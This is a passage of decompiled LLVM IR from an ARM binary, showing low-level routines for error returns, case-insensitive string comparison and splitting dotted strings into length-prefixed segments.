  %tmp25 = icmp slt i32 %v4_1d114, 1
  br i1 %tmp25, label %dec_label_pc_1d13c, label %dec_label_pc_1d120

dec_label_pc_1d120:                               ; preds = %dec_label_pc_1d104
  store i32 %tmp8, i32* @ip, align 4
  %v0_1d124 = load i32, i32* @r8, align 4
  %v1_1d124 = load i32, i32* @r7, align 4
  %v2_1d124 = add i32 %v1_1d124, 8
  %v3_1d124 = inttoptr i32 %v2_1d124 to i32*
  store i32 %v0_1d124, i32* %v3_1d124, align 4
  %v0_1d128 = load i32, i32* @r7, align 4
  %v1_1d128 = load i32, i32* @ip, align 4
  %v2_1d128 = inttoptr i32 %v1_1d128 to i32*
  store i32 %v0_1d128, i32* %v2_1d128, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1d130

dec_label_pc_1d130:                               ; preds = %dec_label_pc_1d0e8, %dec_label_pc_1d120
  %v0_1d134 = phi i32 [ %v0_1d134.pre, %dec_label_pc_1d0e8 ], [ 16, %dec_label_pc_1d120 ]
  store i32 0, i32* @sb, align 4
  %v1_1d134 = load i32, i32* @r7, align 4
  %v2_1d134 = add i32 %v1_1d134, 12
  %v3_1d134 = inttoptr i32 %v2_1d134 to i32*
  store i32 %v0_1d134, i32* %v3_1d134, align 4
  br label %dec_label_pc_1d164

dec_label_pc_1d13c:                               ; preds = %dec_label_pc_1d0fc, %dec_label_pc_1d104, %dec_label_pc_1d0cc
  store i32 2, i32* @sb, align 4
  br label %dec_label_pc_1d140

dec_label_pc_1d140:                               ; preds = %dec_label_pc_1d088.preheader, %dec_label_pc_1d07c.dec_label_pc_1d088_crit_edge, %dec_label_pc_1d064, %dec_label_pc_1d13c, %dec_label_pc_1cff4
  %v0_1d140 = load i32, i32* @r6, align 4
  store i32 %v2_1cffc, i32* %r1.global-to-local, align 4
  store i32 459270, i32* %r2.global-to-local, align 4
  store i32 %v0_1d030, i32* %r3.global-to-local, align 4
  %v5_1d150 = inttoptr i32 %v0_1d140 to i32*
  %v6_1d150 = call i32 @function_17a54(i32* %v5_1d150, i32 %v2_1cffc, i32 459270, i32 %v0_1d030)
  %v2_1d154 = icmp eq i32 %v6_1d150, 0
  br i1 %v2_1d154, label %dec_label_pc_1d15c, label %dec_label_pc_1d044

dec_label_pc_1d15c:                               ; preds = %dec_label_pc_1d140
  %v0_1d15c = load i32, i32* @fp, align 4
  %v7_1d15c = icmp eq i32 %v0_1d15c, 1
  br i1 %v7_1d15c, label %dec_label_pc_1d16c, label %dec_label_pc_1d164

dec_label_pc_1d164:                               ; preds = %dec_label_pc_1d15c, %dec_label_pc_1d130
  %v0_1d164 = load i32, i32* @r6, align 4
  %v1_1d168 = inttoptr i32 %v0_1d164 to i32*
  %v2_1d168 = call i32 @function_17d7c(i32* %v1_1d168)
  br label %dec_label_pc_1d16c

dec_label_pc_1d16c:                               ; preds = %dec_label_pc_1d044, %.thread, %dec_label_pc_1d15c, %dec_label_pc_1cfe0, %dec_label_pc_1d164
  %v0_1d16c = load i32, i32* @sb, align 4
  store i32 %v3_1cf84, i32* @r4, align 4
  store i32 %v6_1cf84, i32* @r5, align 4
  store i32 %v9_1cf84, i32* @r6, align 4
  store i32 %v12_1cf84, i32* @r7, align 4
  store i32 %v15_1cf84, i32* @r8, align 4
  store i32 %v18_1cf84, i32* @sb, align 4
  store i32 %v21_1cf84, i32* @sl, align 4
  store i32 %v24_1cf84, i32* @fp, align 4
  ret i32 %v0_1d16c

; uselistorder directives
  uselistorder i32 %v2_1d088, { 1, 2, 3, 0 }
  uselistorder i32 %v0_1d088.pre, { 1, 0 }
  uselistorder i32 %v2_1cffc, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 4, 3 }
  uselistorder i32 %tmp10, { 2, 0, 1 }
  uselistorder i32 %tmp8, { 3, 2, 1, 0 }
  uselistorder i32 %tmp7, { 2, 1, 0 }
  uselistorder i32* %r3.global-to-local, { 8, 1, 2, 3, 4, 5, 6, 7, 0, 9, 10 }
  uselistorder i32* %r2.global-to-local, { 4, 0, 1, 2, 3, 5, 6, 7, 8 }
  uselistorder i32* %r1.global-to-local, { 6, 1, 2, 3, 4, 0, 5, 7 }
  uselistorder i32 (i32*)* @function_17d7c, { 1, 0 }
  uselistorder i32 (i32*, i32, i32, i32)* @function_17a54, { 2, 0, 1 }
  uselistorder i32 10, { 4, 34, 36, 37, 1, 9, 42, 43, 44, 27, 28, 10, 11, 29, 46, 45, 12, 47, 13, 48, 14, 49, 50, 2, 40, 41, 51, 15, 52, 53, 16, 54, 17, 18, 35, 8, 0, 38, 39, 19, 58, 55, 56, 20, 57, 21, 30, 31, 7, 6, 3, 32, 33, 22, 5, 24, 25, 23, 26, 59 }
  uselistorder i32 (i8*, i32)* @function_13fe0, { 18, 19, 20, 21, 22, 23, 24, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32 24, { 45, 49, 51, 52, 0, 62, 12, 15, 1, 63, 53, 16, 54, 55, 17, 50, 64, 2, 59, 56, 57, 58, 18, 19, 20, 22, 21, 23, 3, 24, 46, 47, 4, 73, 25, 60, 26, 27, 48, 28, 37, 38, 29, 39, 30, 31, 32, 5, 33, 34, 35, 36, 6, 65, 66, 67, 68, 69, 70, 71, 72, 61, 40, 41, 42, 43, 13, 9, 8, 14, 7, 10, 11, 44, 74 }
  uselistorder i32 -48, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 48, { 5, 20, 16, 18, 0, 1, 6, 7, 8, 19, 2, 9, 21, 22, 23, 3, 10, 24, 29, 11, 12, 13, 26, 27, 28, 25, 17, 14, 15, 4 }
  uselistorder i32 34, { 8, 9, 10, 11, 2, 3, 0, 5, 13, 4, 14, 12, 1, 7, 6 }
  uselistorder i32 180260, { 2, 58, 0, 27, 59, 3, 4, 5, 28, 60, 8, 9, 7, 6, 10, 11, 12, 61, 13, 14, 15, 16, 17, 29, 62, 18, 19, 63, 20, 21, 64, 65, 66, 67, 68, 69, 70, 22, 53, 49, 47, 46, 48, 50, 51, 52, 45, 54, 40, 42, 41, 39, 38, 43, 44, 35, 34, 37, 36, 33, 32, 31, 30, 55, 56, 57, 71, 1, 23, 24, 72, 25, 73, 26, 74 }
  uselistorder i32* @fp, { 36, 37, 38, 39, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 0, 62, 72, 73, 74, 75, 76, 77, 78, 79, 80, 2, 3, 58, 59, 60, 61, 81, 82, 83, 1, 84, 85, 86, 87, 88, 63, 64, 65, 66, 67, 68, 69, 70, 71, 40, 41, 42, 43, 44, 45, 46, 47, 4, 109, 111, 110, 112, 126, 127, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 102, 103, 104, 105, 140, 141, 142, 106, 107, 108, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 16, 17, 18 }
  uselistorder i32* @sl, { 15, 16, 17, 18, 24, 25, 26, 27, 28, 29, 30, 31, 32, 39, 40, 41, 42, 43, 0, 44, 1, 45, 46, 47, 48, 49, 50, 51, 52, 53, 5, 6, 33, 34, 35, 36, 37, 38, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 76, 77, 19, 20, 21, 22, 23, 7, 8, 9, 10, 78, 79, 80, 2, 81, 82, 83, 84, 85, 86, 88, 3, 87, 90, 89, 91, 92, 93, 94, 95, 96, 97, 98, 64, 65, 66, 67, 68, 69, 70, 4, 71, 72, 73, 74, 75, 11, 12, 13, 14 }
  uselistorder i32* @sb, { 7, 8, 9, 10, 15, 16, 17, 18, 21, 22, 35, 23, 24, 25, 2, 26, 63, 64, 3, 65, 66, 67, 68, 69, 70, 71, 4, 5, 6, 19, 20, 27, 28, 29, 30, 31, 32, 33, 34, 72, 73, 74, 75, 76, 77, 78, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 1, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 11, 12, 13, 14, 87, 90, 88, 89, 91, 92, 93, 79, 80, 81, 82, 83, 84, 85, 0, 86 }
  uselistorder i32* @r8, { 24, 25, 26, 27, 28, 29, 34, 35, 38, 39, 40, 41, 42, 43, 44, 45, 46, 49, 55, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 5, 6, 7, 36, 37, 50, 51, 2, 52, 53, 54, 68, 69, 70, 71, 72, 73, 74, 75, 76, 56, 57, 87, 88, 47, 48, 30, 31, 32, 33, 8, 9, 10, 11, 12, 3, 13, 89, 90, 91, 92, 93, 4, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 77, 78, 79, 80, 81, 82, 1, 83, 0, 84, 85, 86, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23 }
  uselistorder label %dec_label_pc_1d16c, { 4, 2, 0, 3, 1 }
  uselistorder label %dec_label_pc_1d140, { 3, 1, 2, 0, 4 }
  uselistorder label %dec_label_pc_1d13c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1d130, { 1, 0 }
  uselistorder label %dec_label_pc_1d07c, { 1, 0 }
}

define i32 @function_1d188(i32 %arg1) local_unnamed_addr {
dec_label_pc_1d188:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1d188 = load i32, i32* @r7, align 4
  store i32 %v3_1d188, i32* %stack_var_-8, align 4
  %v0_1d194 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1d194, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1d194, -4095
  br i1 %tmp, label %dec_label_pc_1d1b4, label %dec_label_pc_1d1a4

dec_label_pc_1d1a4:                               ; preds = %dec_label_pc_1d188
  %v0_1d1a4 = call i32 @function_12b24()
  %v0_1d1a8 = load i32, i32* %r7.global-to-local, align 4
  %v1_1d1a8 = sub i32 0, %v0_1d1a8
  %v2_1d1ac = inttoptr i32 %v0_1d1a4 to i32*
  store i32 %v1_1d1a8, i32* %v2_1d1ac, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1d1b4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1d1b4

dec_label_pc_1d1b4:                               ; preds = %dec_label_pc_1d188, %dec_label_pc_1d1a4
  %v1_1d1b8 = phi i32 [ %v0_1d194, %dec_label_pc_1d188 ], [ -1, %dec_label_pc_1d1a4 ]
  %v2_1d1b4 = phi i32 [ %v3_1d188, %dec_label_pc_1d188 ], [ %v2_1d1b4.pre, %dec_label_pc_1d1a4 ]
  store i32 %v2_1d1b4, i32* @r7, align 4
  ret i32 %v1_1d1b8

; uselistorder directives
  uselistorder i32 %v0_1d194, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder i32 ()* @function_12b24, { 52, 51, 49, 48, 47, 46, 45, 84, 83, 82, 34, 40, 33, 32, 78, 77, 42, 76, 41, 50, 31, 28, 38, 37, 7, 81, 80, 75, 74, 73, 72, 0, 59, 22, 27, 79, 26, 11, 25, 21, 20, 19, 44, 43, 71, 70, 69, 18, 17, 58, 10, 35, 60, 61, 15, 14, 54, 62, 36, 6, 30, 29, 68, 9, 3, 5, 39, 66, 16, 67, 1, 56, 4, 12, 65, 13, 63, 55, 64, 24, 2, 23, 57, 53, 8 }
  uselistorder i32* @r7, {}
  uselistorder label %dec_label_pc_1d1b4, { 1, 0 }
}

define i32 @function_1d1bc(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1d1bc:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @ip, align 4
  br label %dec_label_pc_1d1d8

dec_label_pc_1d1d8:                               ; preds = %dec_label_pc_1d204, %dec_label_pc_1d1bc
  %v1_1d21c8 = phi i32 [ %v1_1d21c9, %dec_label_pc_1d204 ], [ 0, %dec_label_pc_1d1bc ]
  %v0_1d20c = phi i32 [ %v1_1d20c, %dec_label_pc_1d204 ], [ %arg2, %dec_label_pc_1d1bc ]
  %v0_1d210 = phi i32 [ %v1_1d210, %dec_label_pc_1d204 ], [ %tmp, %dec_label_pc_1d1bc ]
  %v9_1d1d8 = icmp eq i32 %v0_1d210, %v0_1d20c
  %.pre = inttoptr i32 %v0_1d210 to i8*
  br i1 %v9_1d1d8, label %dec_label_pc_1d204, label %dec_label_pc_1d1e0

dec_label_pc_1d1e0:                               ; preds = %dec_label_pc_1d1d8
  %v2_1d1e0 = load i8, i8* %.pre, align 1
  %v3_1d1e0 = zext i8 %v2_1d1e0 to i32
  %v1_1d1e4 = inttoptr i32 %v0_1d20c to i8*
  %v2_1d1e4 = load i8, i8* %v1_1d1e4, align 1
  %v3_1d1e4 = zext i8 %v2_1d1e4 to i32
  %v4_1d1e8 = load i32, i32* inttoptr (i32 182376 to i32*), align 8
  %v2_1d1ec = mul nuw nsw i32 %v3_1d1e4, 2
  %v2_1d1f0 = mul nuw nsw i32 %v3_1d1e0, 2
  %v2_1d1f4 = add i32 %v4_1d1e8, %v2_1d1ec
  %v3_1d1f4 = inttoptr i32 %v2_1d1f4 to i16*
  %v4_1d1f4 = load i16, i16* %v3_1d1f4, align 2
  %v6_1d1f4 = sext i16 %v4_1d1f4 to i32
  %v2_1d1f8 = add i32 %v4_1d1e8, %v2_1d1f0
  %v3_1d1f8 = inttoptr i32 %v2_1d1f8 to i16*
  %v4_1d1f8 = load i16, i16* %v3_1d1f8, align 2
  %v6_1d1f8 = sext i16 %v4_1d1f8 to i32
  %v2_1d1fc = sub nsw i32 %v6_1d1f8, %v6_1d1f4
  %v9_1d1fc = icmp eq i16 %v4_1d1f8, %v4_1d1f4
  br i1 %v9_1d1fc, label %dec_label_pc_1d204, label %dec_label_pc_1d218

dec_label_pc_1d204:                               ; preds = %dec_label_pc_1d1d8, %dec_label_pc_1d1e0
  %v1_1d21c9 = phi i32 [ %v2_1d1fc, %dec_label_pc_1d1e0 ], [ %v1_1d21c8, %dec_label_pc_1d1d8 ]
  %v2_1d204 = load i8, i8* %.pre, align 1
  %v2_1d208 = icmp eq i8 %v2_1d204, 0
  %v1_1d20c = add i32 %v0_1d20c, 1
  %v1_1d210 = add i32 %v0_1d210, 1
  store i32 %v1_1d210, i32* @ip, align 4
  br i1 %v2_1d208, label %dec_label_pc_1d218, label %dec_label_pc_1d1d8

dec_label_pc_1d218:                               ; preds = %dec_label_pc_1d204, %dec_label_pc_1d1e0
  %v1_1d21c = phi i32 [ %v1_1d21c9, %dec_label_pc_1d204 ], [ %v2_1d1fc, %dec_label_pc_1d1e0 ]
  ret i32 %v1_1d21c

; uselistorder directives
  uselistorder i32 %v1_1d210, { 1, 0 }
  uselistorder i32 %v2_1d1fc, { 1, 0 }
  uselistorder i32 %v0_1d210, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1d204, { 1, 0 }
}

define i32 @function_1d228(i8* %arg1) local_unnamed_addr {
dec_label_pc_1d228:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-32 = alloca i32, align 4
  %v3_1d228 = load i32, i32* @r4, align 4
  store i32 %v3_1d228, i32* %stack_var_-32, align 4
  %v6_1d228 = load i32, i32* @r5, align 4
  %v9_1d228 = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_1d230 = load i32, i32* @r1, align 4
  store i32 %v0_1d230, i32* %r8.global-to-local, align 4
  %v0_1d234 = load i32, i32* @r2, align 4
  store i32 %v0_1d234, i32* %sb.global-to-local, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  store i32 %tmp, i32* @r0, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1d29c23 = icmp slt i8* %arg1, null
  store i1 %v1_1d29c23, i1* %cpsr_n.global-to-local, align 1
  %v2_1d29c24 = icmp eq i8* %arg1, null
  store i1 %v2_1d29c24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1d29c24, label %dec_label_pc_1d2b4, label %dec_label_pc_1d2a8

dec_label_pc_1d240:                               ; preds = %dec_label_pc_1d2a8
  %v2_1d240 = call i32 @function_142f0(i32 %v0_1d24026, i32 46)
  store i32 %v2_1d240, i32* @r6, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1d244 = icmp slt i32 %v2_1d240, 0
  store i1 %v1_1d244, i1* %cpsr_n.global-to-local, align 1
  %v2_1d244 = icmp eq i32 %v2_1d240, 0
  store i1 %v2_1d244, i1* %cpsr_z.global-to-local, align 1
  %v0_1d248 = load i32, i32* @r4, align 4
  %v2_1d248 = sub i32 %v2_1d240, %v0_1d248
  store i32 %v2_1d248, i32* @r5, align 4
  br i1 %v2_1d244, label %dec_label_pc_1d250, label %dec_label_pc_1d25c

dec_label_pc_1d250:                               ; preds = %dec_label_pc_1d240
  store i32 %v0_1d248, i32* @r0, align 4
  %v0_1d254 = call i32 @function_13f70()
  %sext = mul i32 %v0_1d254, 16777216
  %v1_1d258 = sdiv i32 %sext, 16777216
  store i32 %v1_1d258, i32* @r5, align 4
  %v0_1d268.pre = load i32, i32* @r4, align 4
  %v0_1d278.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1d25c

dec_label_pc_1d25c:                               ; preds = %dec_label_pc_1d240, %dec_label_pc_1d250
  %v0_1d278 = phi i32 [ %v2_1d240, %dec_label_pc_1d240 ], [ %v0_1d278.pre, %dec_label_pc_1d250 ]
  %v0_1d268 = phi i32 [ %v0_1d248, %dec_label_pc_1d240 ], [ %v0_1d268.pre, %dec_label_pc_1d250 ]
  %v0_1d288 = phi i32 [ %v2_1d248, %dec_label_pc_1d240 ], [ %v1_1d258, %dec_label_pc_1d250 ]
  %v0_1d25c = load i32, i32* %sl.global-to-local, align 4
  %v1_1d25c = add i32 %v0_1d25c, 1
  store i32 %v1_1d25c, i32* %r7.global-to-local, align 4
  %v1_1d260 = load i32, i32* %sb.global-to-local, align 4
  %v2_1d260 = sub i32 %v1_1d260, %v0_1d25c
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1d264 = icmp slt i32 %v0_1d288, 0
  store i1 %v1_1d264, i1* %cpsr_n.global-to-local, align 1
  %v2_1d264 = icmp eq i32 %v0_1d288, 0
  store i1 %v2_1d264, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_1d268, i32* @r1, align 4
  %v0_1d26c = load i32, i32* %r8.global-to-local, align 4
  %v2_1d26c = add i32 %v0_1d26c, %v1_1d25c
  store i32 %v2_1d26c, i32* @r0, align 4
  store i32 %v0_1d288, i32* @r2, align 4
  %v1_1d274 = add i32 %v2_1d260, -1
  store i32 %v1_1d274, i32* @r3, align 4
  %v1_1d278 = add i32 %v0_1d278, 1
  store i32 %v1_1d278, i32* @r4, align 4
  br i1 %v2_1d264, label %dec_label_pc_1d2c8, label %dec_label_pc_1d280

dec_label_pc_1d280:                               ; preds = %dec_label_pc_1d25c
  %v2_1d280 = sub i32 %v0_1d288, %v1_1d274
  %v3_1d280 = icmp ult i32 %v0_1d288, %v1_1d274
  %v4_1d280 = xor i32 %v1_1d274, %v0_1d288
  %v5_1d280 = xor i32 %v2_1d280, %v0_1d288
  %v6_1d280 = and i32 %v5_1d280, %v4_1d280
  %v7_1d280 = icmp slt i32 %v6_1d280, 0
  store i1 %v7_1d280, i1* %cpsr_v.global-to-local, align 1
  %v8_1d280 = icmp slt i32 %v2_1d280, 0
  store i1 %v8_1d280, i1* %cpsr_n.global-to-local, align 1
  %v9_1d280 = icmp eq i32 %v0_1d288, %v1_1d274
  store i1 %v9_1d280, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_1d280, label %dec_label_pc_1d288, label %dec_label_pc_1d2c8

dec_label_pc_1d288:                               ; preds = %dec_label_pc_1d280
  %v1_1d288 = trunc i32 %v0_1d288 to i8
  %v4_1d288 = add i32 %v0_1d26c, %v0_1d25c
  %v5_1d288 = inttoptr i32 %v4_1d288 to i8*
  store i8 %v1_1d288, i8* %v5_1d288, align 1
  %v0_1d28c = call i32 @function_14000()
  store i32 %v0_1d28c, i32* @r0, align 4
  %v0_1d290 = load i32, i32* @r6, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1d290 = icmp slt i32 %v0_1d290, 0
  store i1 %v1_1d290, i1* %cpsr_n.global-to-local, align 1
  %v2_1d290 = icmp eq i32 %v0_1d290, 0
  store i1 %v2_1d290, i1* %cpsr_z.global-to-local, align 1
  %v0_1d294 = load i32, i32* @r5, align 4
  %v1_1d294 = load i32, i32* %r7.global-to-local, align 4
  %v2_1d294 = add i32 %v1_1d294, %v0_1d294
  store i32 %v2_1d294, i32* %sl.global-to-local, align 4
  br i1 %v2_1d290, label %dec_label_pc_1d2b4, label %dec_label_pc_1d288.dec_label_pc_1d29c_crit_edge

dec_label_pc_1d288.dec_label_pc_1d29c_crit_edge:  ; preds = %dec_label_pc_1d288
  %v0_1d29c.pre = load i32, i32* @r4, align 4
  store i32 %v0_1d29c.pre, i32* @r0, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1d29c = icmp slt i32 %v0_1d29c.pre, 0
  store i1 %v1_1d29c, i1* %cpsr_n.global-to-local, align 1
  %v2_1d29c = icmp eq i32 %v0_1d29c.pre, 0
  store i1 %v2_1d29c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1d29c, label %dec_label_pc_1d2b4, label %dec_label_pc_1d2a8

dec_label_pc_1d2a8:                               ; preds = %dec_label_pc_1d228, %dec_label_pc_1d288.dec_label_pc_1d29c_crit_edge
  %v0_1d24026 = phi i32 [ %v0_1d29c.pre, %dec_label_pc_1d288.dec_label_pc_1d29c_crit_edge ], [ %tmp, %dec_label_pc_1d228 ]
  %v5_1d2bc525 = phi i32 [ %v2_1d294, %dec_label_pc_1d288.dec_label_pc_1d29c_crit_edge ], [ 0, %dec_label_pc_1d228 ]
  %v1_1d2a8 = inttoptr i32 %v0_1d24026 to i8*
  %v2_1d2a8 = load i8, i8* %v1_1d2a8, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_1d2ac = icmp eq i8 %v2_1d2a8, 0
  store i1 %v2_1d2ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1d2ac, label %dec_label_pc_1d2b4, label %dec_label_pc_1d240

dec_label_pc_1d2b4:                               ; preds = %dec_label_pc_1d288.dec_label_pc_1d29c_crit_edge, %dec_label_pc_1d288, %dec_label_pc_1d2a8, %dec_label_pc_1d228
  %v8_1d2c0 = phi i32 [ 0, %dec_label_pc_1d228 ], [ %v5_1d2bc525, %dec_label_pc_1d2a8 ], [ %v2_1d294, %dec_label_pc_1d288 ], [ %v2_1d294, %dec_label_pc_1d288.dec_label_pc_1d29c_crit_edge ]
  %v0_1d2b4 = load i32, i32* %sb.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1d2b4 = icmp slt i32 %v0_1d2b4, 0
  store i1 %v1_1d2b4, i1* %cpsr_n.global-to-local, align 1
  %v2_1d2b4 = icmp eq i32 %v0_1d2b4, 0
  store i1 %v2_1d2b4, i1* %cpsr_z.global-to-local, align 1
  %tmp21 = icmp slt i32 %v0_1d2b4, 1
  br i1 %tmp21, label %bb22, label %bb

bb:                                               ; preds = %dec_label_pc_1d2b4
  %v6_1d2bc = add i32 %v8_1d2c0, 1
  store i32 %v6_1d2bc, i32* @r0, align 4
  %v7_1d2c0 = load i32, i32* %r8.global-to-local, align 4
  %v9_1d2c0 = add i32 %v7_1d2c0, %v8_1d2c0
  %v10_1d2c0 = inttoptr i32 %v9_1d2c0 to i8*
  store i8 0, i8* %v10_1d2c0, align 1
  %v0_1d2c4.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_1d2c4.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_1d2c4.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %bb22

bb22:                                             ; preds = %dec_label_pc_1d2b4, %bb
  %v2_1d2c4 = phi i1 [ %v2_1d2c4.pre, %bb ], [ false, %dec_label_pc_1d2b4 ]
  %v1_1d2c4 = phi i1 [ %v1_1d2c4.pre, %bb ], [ %v1_1d2b4, %dec_label_pc_1d2b4 ]
  %v0_1d2c4 = phi i1 [ %v0_1d2c4.pre, %bb ], [ %v2_1d2b4, %dec_label_pc_1d2b4 ]
  %v3_1d2c4 = xor i1 %v2_1d2c4, %v1_1d2c4
  %v4_1d2c4 = or i1 %v0_1d2c4, %v3_1d2c4
  br i1 %v4_1d2c4, label %dec_label_pc_1d2c8, label %.dec_label_pc_1d2cc_crit_edge

.dec_label_pc_1d2cc_crit_edge:                    ; preds = %bb22
  %v1_1d2d0.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1d2cc

dec_label_pc_1d2c8:                               ; preds = %dec_label_pc_1d280, %dec_label_pc_1d25c, %bb22
  br label %dec_label_pc_1d2cc

dec_label_pc_1d2cc:                               ; preds = %.dec_label_pc_1d2cc_crit_edge, %dec_label_pc_1d2c8
  %v1_1d2d0 = phi i32 [ %v1_1d2d0.pre, %.dec_label_pc_1d2cc_crit_edge ], [ -1, %dec_label_pc_1d2c8 ]
  %v2_1d2cc = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_1d2cc, i32* @r4, align 4
  store i32 %v6_1d228, i32* @r5, align 4
  store i32 %v9_1d228, i32* @r6, align 4
  ret i32 %v1_1d2d0

; uselistorder directives
  uselistorder i32 %v0_1d2b4, { 0, 2, 1 }
  uselistorder i32 %v0_1d29c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_1d290, { 1, 0 }
  uselistorder i32 %v2_1d280, { 1, 0 }
  uselistorder i32 %v1_1d274, { 2, 0, 3, 1, 4 }
  uselistorder i32 %v0_1d288, { 2, 4, 0, 1, 5, 3, 6, 7, 8 }
  uselistorder i32 %v1_1d258, { 1, 0 }
  uselistorder i1 %v2_1d29c24, { 1, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 7, 8, 3, 4, 5, 6, 0 }
  uselistorder i1* %cpsr_v.global-to-local, { 1, 2, 7, 8, 3, 4, 5, 6, 0 }
  uselistorder i1* %cpsr_n.global-to-local, { 1, 2, 7, 8, 3, 4, 5, 6, 0 }
  uselistorder i8 0, { 9, 48, 49, 1, 2, 50, 3, 52, 53, 51, 54, 4, 55, 31, 56, 11, 12, 57, 5, 58, 59, 61, 60, 34, 62, 35, 13, 64, 63, 14, 15, 16, 17, 18, 66, 65, 36, 67, 6, 68, 69, 10, 70, 32, 33, 72, 73, 71, 74, 76, 75, 37, 77, 19, 78, 79, 80, 20, 81, 7, 82, 46, 21, 22, 23, 24, 25, 26, 83, 84, 85, 86, 87, 38, 88, 89, 91, 92, 93, 94, 90, 27, 28, 0, 95, 96, 97, 29, 99, 98, 30, 100, 101, 102, 39, 103, 104, 8, 106, 40, 107, 108, 105, 109, 110, 111, 112, 114, 113, 115, 131, 132, 130, 128, 129, 126, 127, 124, 125, 122, 123, 120, 121, 117, 118, 119, 116, 133, 134, 135, 136, 137, 138, 140, 139, 142, 141, 143, 41, 145, 144, 47, 146, 42, 147, 149, 150, 148, 43, 151, 152, 45, 153, 44, 154, 155, 156, 157, 158 }
  uselistorder i32 ()* @function_14000, { 19, 18, 17, 12, 11, 10, 9, 8, 7, 24, 16, 15, 6, 14, 3, 2, 0, 1, 5, 4, 13, 23, 22, 21, 20 }
  uselistorder i32 ()* @function_13f70, { 16, 14, 13, 12, 11, 10, 31, 30, 15, 8, 7, 6, 29, 28, 27, 26, 24, 25, 23, 22, 21, 20, 9, 19, 18, 17, 0, 1, 2, 5, 4, 3 }
  uselistorder i32 (i32, i32)* @function_142f0, { 11, 7, 6, 5, 4, 3, 0, 10, 9, 8, 17, 16, 15, 14, 13, 12, 2, 1 }
  uselistorder i32 46, { 0, 1, 5, 6, 7, 8, 4, 2, 3 }
  uselistorder label %dec_label_pc_1d2cc, { 1, 0 }
  uselistorder label %dec_label_pc_1d2c8, { 2, 0, 1 }
  uselistorder label %bb22, { 1, 0 }
  uselistorder label %dec_label_pc_1d2b4, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1d2a8, { 1, 0 }
  uselistorder label %dec_label_pc_1d25c, { 1, 0 }
}

define i32 @function_1d2d4() local_unnamed_addr {
dec_label_pc_1d2d4:
  %v0_1d2d4 = load i32, i32* @r1, align 4
  %v1_1d2d4 = icmp slt i32 %v0_1d2d4, 0
  %v2_1d2d4 = icmp eq i32 %v0_1d2d4, 0
  %v0_1d2d8 = load i32, i32* @r0, align 4
  %v2_1d2d8 = xor i32 %v0_1d2d8, %v0_1d2d4
  br i1 %v2_1d2d4, label %dec_label_pc_1d3ec, label %dec_label_pc_1d2e0

dec_label_pc_1d2e0:                               ; preds = %dec_label_pc_1d2d4
  br i1 %v1_1d2d4, label %bb, label %thread-pre-split

bb:                                               ; preds = %dec_label_pc_1d2e0
  %v2_1d2e0 = sub i32 0, %v0_1d2d4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_1d2e0, %bb
